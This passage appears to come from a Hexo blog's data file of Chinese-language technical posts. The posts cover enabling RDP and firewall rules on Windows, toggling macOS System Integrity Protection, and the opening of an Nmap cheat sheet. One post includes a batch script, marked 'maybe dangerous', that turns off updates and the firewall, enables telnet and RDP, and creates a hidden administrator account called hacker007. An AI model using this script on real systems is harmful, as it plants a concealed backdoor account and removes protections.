class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 开启RDP</span></div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class=\"line\"><span class=\"comment\"># 关闭RDP</span></div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 1 /f</div><div class=\"line\"><span class=\"comment\"># 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭</span></div><div class=\"line\">reg query <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections</div></pre></td></tr></table></figure>\n<h2 id=\"RDP端口\"><a href=\"#RDP端口\" class=\"headerlink\" title=\"RDP端口\"></a>RDP端口</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 查询rdp端口号</span></div><div class=\"line\">reg query <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"</span> /v PortNumber</div></pre></td></tr></table></figure>\n<h2 id=\"防火墙相关-Netsh-AdvFirewall-aspx\"><a href=\"#防火墙相关-Netsh-AdvFirewall-aspx\" class=\"headerlink\" title=\"防火墙相关 Netsh AdvFirewall.aspx)\"></a>防火墙相关 <a href=\"https://technet.microsoft.com/en-us/library/dd736198(v=ws.10\" target=\"_blank\" rel=\"external\">Netsh AdvFirewall</a>.aspx)</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 防火墙状态</span></div><div class=\"line\">netsh advfirewall monitor show firewall</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 允许访问3389端口</span></div><div class=\"line\">netsh advfirewall firewall add rule name=<span class=\"string\">\"Open Port 3389\"</span> dir=<span class=\"keyword\">in</span> action=allow protocol=TCP localport=3389</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 关闭防火墙</span></div><div class=\"line\">netsh firewall <span class=\"built_in\">set</span> opmode mode=<span class=\"built_in\">disable</span></div></pre></td></tr></table></figure>\n<h2 id=\"开启远程协助\"><a href=\"#开启远程协助\" class=\"headerlink\" title=\"开启远程协助\"></a>开启远程协助</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fAllowToGetHelp /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>\n<h2 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 从进程中查找rdp进程</span></div><div class=\"line\">tasklist  /svc | find <span class=\"string\">\"TermService\"</span></div><div class=\"line\"><span class=\"comment\"># 根据pid（1316）查询端口号</span></div><div class=\"line\">netstat -ano | find <span class=\"string\">\"1316\"</span></div></pre></td></tr></table></figure>\n<h2 id=\"脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt\"><a href=\"#脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt\" class=\"headerlink\" title=\"脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;\"></a>脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\">@<span class=\"built_in\">echo</span> off</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Disable off <span class=\"string\">\"AUTO UPDATE\"</span></div><div class=\"line\">REM ****************</div><div class=\"line\">sc config wuauserv start= disabled</div><div class=\"line\">net stop wuauserv</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Disable windows xp Firewall</div><div class=\"line\">REM ****************</div><div class=\"line\">netsh firewall <span class=\"built_in\">set</span> opmode <span class=\"built_in\">disable</span></div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Enable TELNET</div><div class=\"line\">REM ****************</div><div class=\"line\">sc config tlntsvr start= auto</div><div class=\"line\">net start telnet</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Enable Remote Desktop</div><div class=\"line\">REM ****************</div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class=\"line\"></div><div class=\"line\">REM ***************</div><div class=\"line\">REM Create a HIDDEN USER usr= hack007, pass= dani</div><div class=\"line\">REM ***************</div><div class=\"line\">net user hacker007 dani /add</div><div class=\"line\">net localgroup <span class=\"string\">\"Administrators\"</span> /add hacker007</div><div class=\"line\">net localgroup <span class=\"string\">\"Users\"</span> /del hacker007</div><div class=\"line\">reg add <span class=\"string\">\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\"</span> /v hacker007 /t REG_DWORD /d 0 /f</div><div class=\"line\">reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"开启RDP\"><a href=\"#开启RDP\" class=\"headerlink\" title=\"开启RDP\"></a>开启RDP</h2><p>通过命令行修改注册表。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 开启RDP</span></div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class=\"line\"><span class=\"comment\"># 关闭RDP</span></div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 1 /f</div><div class=\"line\"><span class=\"comment\"># 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭</span></div><div class=\"line\">reg query <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections</div></pre></td></tr></table></figure>\n<h2 id=\"RDP端口\"><a href=\"#RDP端口\" class=\"headerlink\" title=\"RDP端口\"></a>RDP端口</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 查询rdp端口号</span></div><div class=\"line\">reg query <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"</span> /v PortNumber</div></pre></td></tr></table></figure>\n<h2 id=\"防火墙相关-Netsh-AdvFirewall-aspx\"><a href=\"#防火墙相关-Netsh-AdvFirewall-aspx\" class=\"headerlink\" title=\"防火墙相关 Netsh AdvFirewall.aspx)\"></a>防火墙相关 <a href=\"https://technet.microsoft.com/en-us/library/dd736198(v=ws.10\">Netsh AdvFirewall</a>.aspx)</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 防火墙状态</span></div><div class=\"line\">netsh advfirewall monitor show firewall</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 允许访问3389端口</span></div><div class=\"line\">netsh advfirewall firewall add rule name=<span class=\"string\">\"Open Port 3389\"</span> dir=<span class=\"keyword\">in</span> action=allow protocol=TCP localport=3389</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 关闭防火墙</span></div><div class=\"line\">netsh firewall <span class=\"built_in\">set</span> opmode mode=<span class=\"built_in\">disable</span></div></pre></td></tr></table></figure>\n<h2 id=\"开启远程协助\"><a href=\"#开启远程协助\" class=\"headerlink\" title=\"开启远程协助\"></a>开启远程协助</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fAllowToGetHelp /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>\n<h2 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 从进程中查找rdp进程</span></div><div class=\"line\">tasklist  /svc | find <span class=\"string\">\"TermService\"</span></div><div class=\"line\"><span class=\"comment\"># 根据pid（1316）查询端口号</span></div><div class=\"line\">netstat -ano | find <span class=\"string\">\"1316\"</span></div></pre></td></tr></table></figure>\n<h2 id=\"脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt\"><a href=\"#脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt\" class=\"headerlink\" title=\"脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;\"></a>脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\">@<span class=\"built_in\">echo</span> off</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Disable off <span class=\"string\">\"AUTO UPDATE\"</span></div><div class=\"line\">REM ****************</div><div class=\"line\">sc config wuauserv start= disabled</div><div class=\"line\">net stop wuauserv</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Disable windows xp Firewall</div><div class=\"line\">REM ****************</div><div class=\"line\">netsh firewall <span class=\"built_in\">set</span> opmode <span class=\"built_in\">disable</span></div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Enable TELNET</div><div class=\"line\">REM ****************</div><div class=\"line\">sc config tlntsvr start= auto</div><div class=\"line\">net start telnet</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Enable Remote Desktop</div><div class=\"line\">REM ****************</div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class=\"line\"></div><div class=\"line\">REM ***************</div><div class=\"line\">REM Create a HIDDEN USER usr= hack007, pass= dani</div><div class=\"line\">REM ***************</div><div class=\"line\">net user hacker007 dani /add</div><div class=\"line\">net localgroup <span class=\"string\">\"Administrators\"</span> /add hacker007</div><div class=\"line\">net localgroup <span class=\"string\">\"Users\"</span> /del hacker007</div><div class=\"line\">reg add <span class=\"string\">\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\"</span> /v hacker007 /t REG_DWORD /d 0 /f</div><div class=\"line\">reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>"},{"title":"MacOS - SIP (System Integrity Protection) 系统集成保护","date":"2017-04-26T11:19:03.000Z","_content":"# Mac - SIP 系统集成保护\n官方资料[About System Integrity Protection on your Mac](https://support.apple.com/en-us/HT204899)\n\n## 开启/关闭SIP\n参考来源 [http://www.jianshu.com/p/0572336a0771](http://www.jianshu.com/p/0572336a0771)\n### 1.进入Recovery Mode\n开机按住command+R\n\n### 2.使用csrutil命令\n\n打开终端Terminal，键入csrutil可以显示该命令的使用方法\n```bash\n➜  ~ csrutil\nusage: csrutil <command>\nModify the System Integrity Protection configuration. All configuration changes apply to the entire machine.\nAvailable commands:\n\n    clear\n        Clear the existing configuration. Only available in Recovery OS.\n    disable\n        Disable the protection on the machine. Only available in Recovery OS.\n    enable\n        Enable the protection on the machine. Only available in Recovery OS.\n    status\n        Display the current configuration.\n\n    netboot\n        add <address>\n            Insert a new IPv4 address in the list of allowed NetBoot sources.\n        list\n            Print the list of allowed NetBoot sources.\n        remove <address>\n            Remove an IPv4 address from the list of allowed NetBoot sources.\n```\n正常系统模式下仅可以用status命令查询SIP状态\n\n### 3.常用参数\nclear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效)\n\ndisable：关闭SIP(仅在恢复模式下有效)\n\nenable：开启SIP(仅在恢复模式下有效)\n\nstatus：查询SIP状态\n\n### 4.常用参数进阶\n\n除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下\n```bash\ncsrutil enable [--without kext|fs|debug|dtrace|nvram] [--no-internal]\n# 单项使用：\nsudo csrutil enable –without fs：Filesystem Protections disable\nsudo csrutil enable –without kext：Kext Signing disable\nsudo csrutil enable –without debug：Debugging Restrictions disable\nsudo csrutil enable –without nvram：NVRAM Protections disable\nsudo csrutil enable –without dtrace：DTrace Restrictions disable\n# 组合使用：\nsudo csrutil enable –without kext –without fs：Filesystem Protections and Kext Signing are disabled\n```\n\n## mac下使用proxychains-ng实现代理\n由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。","source":"_posts/Mac-SIP.md","raw":"---\ntitle: MacOS - SIP (System Integrity Protection) 系统集成保护\ndate: 2017-04-26 19:19:03\ntags: \n---\n# Mac - SIP 系统集成保护\n官方资料[About System Integrity Protection on your Mac](https://support.apple.com/en-us/HT204899)\n\n## 开启/关闭SIP\n参考来源 [http://www.jianshu.com/p/0572336a0771](http://www.jianshu.com/p/0572336a0771)\n### 1.进入Recovery Mode\n开机按住command+R\n\n### 2.使用csrutil命令\n\n打开终端Terminal，键入csrutil可以显示该命令的使用方法\n```bash\n➜  ~ csrutil\nusage: csrutil <command>\nModify the System Integrity Protection configuration. All configuration changes apply to the entire machine.\nAvailable commands:\n\n    clear\n        Clear the existing configuration. Only available in Recovery OS.\n    disable\n        Disable the protection on the machine. Only available in Recovery OS.\n    enable\n        Enable the protection on the machine. Only available in Recovery OS.\n    status\n        Display the current configuration.\n\n    netboot\n        add <address>\n            Insert a new IPv4 address in the list of allowed NetBoot sources.\n        list\n            Print the list of allowed NetBoot sources.\n        remove <address>\n            Remove an IPv4 address from the list of allowed NetBoot sources.\n```\n正常系统模式下仅可以用status命令查询SIP状态\n\n### 3.常用参数\nclear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效)\n\ndisable：关闭SIP(仅在恢复模式下有效)\n\nenable：开启SIP(仅在恢复模式下有效)\n\nstatus：查询SIP状态\n\n### 4.常用参数进阶\n\n除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下\n```bash\ncsrutil enable [--without kext|fs|debug|dtrace|nvram] [--no-internal]\n# 单项使用：\nsudo csrutil enable –without fs：Filesystem Protections disable\nsudo csrutil enable –without kext：Kext Signing disable\nsudo csrutil enable –without debug：Debugging Restrictions disable\nsudo csrutil enable –without nvram：NVRAM Protections disable\nsudo csrutil enable –without dtrace：DTrace Restrictions disable\n# 组合使用：\nsudo csrutil enable –without kext –without fs：Filesystem Protections and Kext Signing are disabled\n```\n\n## mac下使用proxychains-ng实现代理\n由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。","slug":"Mac-SIP","published":1,"updated":"2017-04-26T11:20:21.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3oaflt30001a8uv84fhxh6k","content":"<h1 id=\"Mac-SIP-系统集成保护\"><a href=\"#Mac-SIP-系统集成保护\" class=\"headerlink\" title=\"Mac - SIP 系统集成保护\"></a>Mac - SIP 系统集成保护</h1><p>官方资料<a href=\"https://support.apple.com/en-us/HT204899\" target=\"_blank\" rel=\"external\">About System Integrity Protection on your Mac</a></p>\n<h2 id=\"开启-关闭SIP\"><a href=\"#开启-关闭SIP\" class=\"headerlink\" title=\"开启/关闭SIP\"></a>开启/关闭SIP</h2><p>参考来源 <a href=\"http://www.jianshu.com/p/0572336a0771\" target=\"_blank\" rel=\"external\">http://www.jianshu.com/p/0572336a0771</a></p>\n<h3 id=\"1-进入Recovery-Mode\"><a href=\"#1-进入Recovery-Mode\" class=\"headerlink\" title=\"1.进入Recovery Mode\"></a>1.进入Recovery Mode</h3><p>开机按住command+R</p>\n<h3 id=\"2-使用csrutil命令\"><a href=\"#2-使用csrutil命令\" class=\"headerlink\" title=\"2.使用csrutil命令\"></a>2.使用csrutil命令</h3><p>打开终端Terminal，键入csrutil可以显示该命令的使用方法<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  ~ csrutil</div><div class=\"line\">usage: csrutil &lt;<span class=\"built_in\">command</span>&gt;</div><div class=\"line\">Modify the System Integrity Protection configuration. All configuration changes apply to the entire machine.</div><div class=\"line\">Available commands:</div><div class=\"line\"></div><div class=\"line\">    clear</div><div class=\"line\">        Clear the existing configuration. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    <span class=\"built_in\">disable</span></div><div class=\"line\">        Disable the protection on the machine. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    <span class=\"built_in\">enable</span></div><div class=\"line\">        Enable the protection on the machine. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    status</div><div class=\"line\">        Display the current configuration.</div><div class=\"line\"></div><div class=\"line\">    netboot</div><div class=\"line\">        add &lt;address&gt;</div><div class=\"line\">            Insert a new IPv4 address <span class=\"keyword\">in</span> the list of allowed NetBoot sources.</div><div class=\"line\">        list</div><div class=\"line\">            Print the list of allowed NetBoot sources.</div><div class=\"line\">        remove &lt;address&gt;</div><div class=\"line\">            Remove an IPv4 address from the list of allowed NetBoot sources.</div></pre></td></tr></table></figure></p>\n<p>正常系统模式下仅可以用status命令查询SIP状态</p>\n<h3 id=\"3-常用参数\"><a href=\"#3-常用参数\" class=\"headerlink\" title=\"3.常用参数\"></a>3.常用参数</h3><p>clear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效)</p>\n<p>disable：关闭SIP(仅在恢复模式下有效)</p>\n<p>enable：开启SIP(仅在恢复模式下有效)</p>\n<p>status：查询SIP状态</p>\n<h3 id=\"4-常用参数进阶\"><a href=\"#4-常用参数进阶\" class=\"headerlink\" title=\"4.常用参数进阶\"></a>4.常用参数进阶</h3><p>除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">csrutil <span class=\"built_in\">enable</span> [--without kext|fs|debug|dtrace|nvram] [--no-internal]</div><div class=\"line\"><span class=\"comment\"># 单项使用：</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without fs：Filesystem Protections <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without kext：Kext Signing <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without debug：Debugging Restrictions <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without nvram：NVRAM Protections <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without dtrace：DTrace Restrictions <span class=\"built_in\">disable</span></div><div class=\"line\"><span class=\"comment\"># 组合使用：</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without kext –without fs：Filesystem Protections and Kext Signing are disabled</div></pre></td></tr></table></figure></p>\n<h2 id=\"mac下使用proxychains-ng实现代理\"><a href=\"#mac下使用proxychains-ng实现代理\" class=\"headerlink\" title=\"mac下使用proxychains-ng实现代理\"></a>mac下使用proxychains-ng实现代理</h2><p>由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Mac-SIP-系统集成保护\"><a href=\"#Mac-SIP-系统集成保护\" class=\"headerlink\" title=\"Mac - SIP 系统集成保护\"></a>Mac - SIP 系统集成保护</h1><p>官方资料<a href=\"https://support.apple.com/en-us/HT204899\">About System Integrity Protection on your Mac</a></p>\n<h2 id=\"开启-关闭SIP\"><a href=\"#开启-关闭SIP\" class=\"headerlink\" title=\"开启/关闭SIP\"></a>开启/关闭SIP</h2><p>参考来源 <a href=\"http://www.jianshu.com/p/0572336a0771\">http://www.jianshu.com/p/0572336a0771</a></p>\n<h3 id=\"1-进入Recovery-Mode\"><a href=\"#1-进入Recovery-Mode\" class=\"headerlink\" title=\"1.进入Recovery Mode\"></a>1.进入Recovery Mode</h3><p>开机按住command+R</p>\n<h3 id=\"2-使用csrutil命令\"><a href=\"#2-使用csrutil命令\" class=\"headerlink\" title=\"2.使用csrutil命令\"></a>2.使用csrutil命令</h3><p>打开终端Terminal，键入csrutil可以显示该命令的使用方法<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  ~ csrutil</div><div class=\"line\">usage: csrutil &lt;<span class=\"built_in\">command</span>&gt;</div><div class=\"line\">Modify the System Integrity Protection configuration. All configuration changes apply to the entire machine.</div><div class=\"line\">Available commands:</div><div class=\"line\"></div><div class=\"line\">    clear</div><div class=\"line\">        Clear the existing configuration. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    <span class=\"built_in\">disable</span></div><div class=\"line\">        Disable the protection on the machine. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    <span class=\"built_in\">enable</span></div><div class=\"line\">        Enable the protection on the machine. Only available <span class=\"keyword\">in</span> Recovery OS.</div><div class=\"line\">    status</div><div class=\"line\">        Display the current configuration.</div><div class=\"line\"></div><div class=\"line\">    netboot</div><div class=\"line\">        add &lt;address&gt;</div><div class=\"line\">            Insert a new IPv4 address <span class=\"keyword\">in</span> the list of allowed NetBoot sources.</div><div class=\"line\">        list</div><div class=\"line\">            Print the list of allowed NetBoot sources.</div><div class=\"line\">        remove &lt;address&gt;</div><div class=\"line\">            Remove an IPv4 address from the list of allowed NetBoot sources.</div></pre></td></tr></table></figure></p>\n<p>正常系统模式下仅可以用status命令查询SIP状态</p>\n<h3 id=\"3-常用参数\"><a href=\"#3-常用参数\" class=\"headerlink\" title=\"3.常用参数\"></a>3.常用参数</h3><p>clear：清除配置设置，等同于完全开启SIP(仅在恢复模式下有效)</p>\n<p>disable：关闭SIP(仅在恢复模式下有效)</p>\n<p>enable：开启SIP(仅在恢复模式下有效)</p>\n<p>status：查询SIP状态</p>\n<h3 id=\"4-常用参数进阶\"><a href=\"#4-常用参数进阶\" class=\"headerlink\" title=\"4.常用参数进阶\"></a>4.常用参数进阶</h3><p>除了可以完全关闭/打开，还可以进行单项和多项组合关闭相关功能，用法如下<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">csrutil <span class=\"built_in\">enable</span> [--without kext|fs|debug|dtrace|nvram] [--no-internal]</div><div class=\"line\"><span class=\"comment\"># 单项使用：</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without fs：Filesystem Protections <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without kext：Kext Signing <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without debug：Debugging Restrictions <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without nvram：NVRAM Protections <span class=\"built_in\">disable</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without dtrace：DTrace Restrictions <span class=\"built_in\">disable</span></div><div class=\"line\"><span class=\"comment\"># 组合使用：</span></div><div class=\"line\">sudo csrutil <span class=\"built_in\">enable</span> –without kext –without fs：Filesystem Protections and Kext Signing are disabled</div></pre></td></tr></table></figure></p>\n<h2 id=\"mac下使用proxychains-ng实现代理\"><a href=\"#mac下使用proxychains-ng实现代理\" class=\"headerlink\" title=\"mac下使用proxychains-ng实现代理\"></a>mac下使用proxychains-ng实现代理</h2><p>由于mac下SIP的保护，不能使用proxychains，除非关闭SIP。</p>\n"},{"title":"Nmap cheat sheet","date":"2017-05-07T10:47:45.000Z","_content":"http://www.91ri.org/8654.html\n## Nmap 介绍\n![功能架构图](http://my.csdn.net/uploads/201206/26/1340719324_9785.JPG)\n\n### 四项基本功能\n\n- 主机发现（Host Discovery）\n\n- 端口扫描（Port Scanning）\n\n- 版本侦测（Version Detection）\n\n- 操作系统侦测（Operating System Detection）\n\n    而这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基础上，Nmap提供防火墙与IDS（IntrusionDetection System,入侵检测系统）的规避技巧，可以综合应用到四个基本功能的各个阶段；另外Nmap提供强大的NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充和扩展。\n\n## 基本使用\n### 主机发现\n\n\n```bash\nnmap oddboy.cn 192.168.0,1,4-7.2-255 10.1.1.0/24    # 多主机地址扫描\nnmap -A -T4 host        \n# -A 对主机进行完整全面的扫描(主机发现、端口扫描、应用程序与版本侦测、操作系统侦测及调用默认NSE脚本扫描)\n# -T4 